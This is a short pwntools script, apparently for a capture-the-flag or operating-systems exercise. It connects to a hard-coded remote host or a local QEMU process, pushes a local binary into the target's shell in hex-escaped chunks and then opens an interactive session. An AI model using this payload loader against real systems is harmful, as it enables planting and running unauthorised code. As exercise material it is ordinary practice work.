from pwn import *
import time
import sys


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))

    with open('./_hello', 'rb') as f:
        buf = f.read()
    proc.recvuntil('$')
    proc.sendline('>exp')
    offset = 10
    while len(buf) > 0:
        cmd = b'(cat exp; echo -n '
        for i in buf[:offset]:
            cmd += bytes('\\x{:02x}'.format(i), 'ascii')
        cmd += b') > exp'
        print(proc.recvuntil('$'))
        proc.sendline(cmd)
        print(cmd)
        buf = buf[offset:]


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc 160.94.179.150 4011'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['make qemu-nox'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
